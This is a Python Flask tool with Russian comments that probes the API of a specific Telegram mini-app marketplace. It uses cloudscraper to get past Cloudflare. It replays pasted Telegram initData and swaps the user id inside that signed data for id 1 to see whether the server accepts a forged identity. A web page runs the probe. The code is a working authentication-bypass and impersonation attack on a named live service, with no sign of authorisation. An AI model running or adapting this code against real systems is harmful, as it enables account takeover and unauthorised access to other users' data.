import os
import json
import time
import hmac
import hashlib
import cloudscraper
from urllib.parse import parse_qsl, urlencode
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

TARGET_BASE = "https://api.gates-market.io"
TEST_ENDPOINT = "/api/v1/users/me"

# Создаем сессию Cloudscraper (обходит Cloudflare)
scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'chrome',
        'platform': 'ios',
        'mobile': True
    }
)

def parse_init_data(raw: str) -> dict:
    return dict(parse_qsl(raw, keep_blank_values=True))

def tamper_user_id(raw: str, new_id: int) -> str:
    pairs = parse_init_data(raw)
    user = json.loads(pairs.get("user", "{}"))
    user["id"] = new_id
    pairs["user"] = json.dumps(user, separators=(",", ":"))
    return urlencode(pairs)

def make_request(raw_init_data: str, endpoint: str = TEST_ENDPOINT) -> dict:
    url = TARGET_BASE.rstrip("/") + endpoint
    headers = {
        "Accept": "application/json",
        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
        "X-Telegram-Init-Data": raw_init_data,
        "Origin": "https://tg-app.gates-market.io",
        "Referer": "https://tg-app.gates-market.io/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    }
    try:
        r = scraper.get(url, headers=headers, timeout=20)
        return {"status": r.status_code, "body": r.text[:300]}
    except Exception as e:
        return {"error": str(e)}

def probe_live(raw: str) -> dict:
    if not raw:
        return {"error": "empty initData"}
        
    report = {}
    pairs = parse_init_data(raw)
    try:
        auth_date = int(pairs.get("auth_date", 0))
        now = int(time.time())
        report["age_seconds"] = now - auth_date
    except:
        report["age_seconds"] = -1

    report["original"] = make_request(raw)
    report["replay"] = make_request(raw)
    
    try:
        tampered_raw = tamper_user_id(raw, 1)
        report["tamper_id_1"] = make_request(tampered_raw)
    except Exception as e:
        report["tamper_id_1"] = {"error": str(e)}
        
    return report

# ─────────── Веб-интерфейс (тот же) ───────────
HTML_UI = """
<!doctype html>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    body { font-family: -apple-system, sans-serif; background: #121212; color: #e0e0e0; padding: 15px; }
    textarea { width: 100%; box-sizing: border-box; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #333; background: #1e1e1e; color: #fff; font-size: 16px; }
    button { width: 100%; padding: 14px; background: #007aff; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; }
    pre { background: #000; padding: 15px; border-radius: 8px; overflow-x: auto; font-size: 14px; white-space: pre-wrap; }
</style>
<h2>gates-market probe (CF Bypass)</h2>
<textarea id="init" rows="6" placeholder="X-Telegram-Init-Data..."></textarea>
<button onclick="run()">RUN PROBE</button>
<pre id="out">Waiting...</pre>
<script>
async function run() {
    const btn = document.querySelector('button');
    const out = document.getElementById('out');
    const raw = document.getElementById('init').value.trim();
    if (!raw) { out.textContent = "Paste initData first."; return; }
    btn.disabled = true; btn.textContent = "Probing...";
    out.textContent = "Sending requests...";
    try {
        const r = await fetch('/probe', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ initData: raw })
        });
        out.textContent = JSON.stringify(await r.json(), null, 2);
    } catch (e) {
        out.textContent = "Error: " + e.message;
    } finally { btn.disabled = false; btn.textContent = "RUN PROBE"; }
}
</script>
"""

@app.route("/")
@app.route("/ui")
def ui():
    return render_template_string(HTML_UI)

@app.route("/probe", methods=["POST"])
def probe():
    body = request.get_json(force=True, silent=True) or {}
    raw = body.get("initData", "")
    if not raw: return jsonify({"error": "No initData provided"}), 400
    return jsonify(probe_live(raw))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
